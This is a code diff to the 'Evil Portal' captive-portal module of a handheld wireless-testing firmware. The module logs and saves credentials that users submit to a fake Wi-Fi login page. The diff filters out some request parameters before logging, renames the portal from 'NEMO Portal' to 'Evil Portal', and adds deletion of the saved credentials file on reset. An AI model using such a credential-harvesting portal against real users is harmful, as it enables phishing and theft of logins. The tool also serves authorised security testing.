@@ -19,13 +19,17 @@ void handleCreds() {
       String csvLine = "";
       last_cred="";
       for (int i = 0; i < ep->args(); i++) {
-        html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
-        // Prepara dados para salvar no SD
-        if (i != 0) {
-          csvLine += ",";
+        String tmp=ep->argName(i);
+        if(tmp=="q" || tmp.startsWith("cup2") || tmp.startsWith("plain")) continue;
+        else {
+          html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
+          // Prepara dados para salvar no SD
+          if (i != 0) {
+            csvLine += ",";
+          }
+          csvLine += ep->argName(i) + ": " + ep->arg(i);
+          last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
         }
-        csvLine += ep->argName(i) + ": " + ep->arg(i);
-        last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
       }
       html_temp += "</li>\n";
       saveToCSV("/Bruce_creds.csv", csvLine);
@@ -231,10 +235,10 @@ String creds_GET() {
 }
 
 String ssid_GET() {
-  return getHtmlContents("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+AP_name+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
+  return getHtmlContents("<p>Set a new SSID for Evil Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+AP_name+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
 }
 String ssid_POST() {
-  return getHtmlContents("NEMO Portal shutting down and restarting with SSID <b>" + AP_name + "</b>. Please reconnect.");
+  return getHtmlContents("Evil Portal shutting down and restarting with SSID <b>" + AP_name + "</b>. Please reconnect.");
 }
 
 String index_GET() {
@@ -251,6 +255,8 @@ String clear_GET() {
   String email = "<p></p>";
   String password = "<p></p>";
   capturedCredentialsHtml = "<p></p>";
+  if (LittleFS.begin()) if (LittleFS.exists("/Bruce_creds.csv")) LittleFS.remove("/Bruce_creds.csv");
+  if (SD.begin()) if (SD.exists("/Bruce_creds.csv")) SD.remove("/Bruce_creds.csv");
   totalCapturedCredentials = 0;
   return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
 }
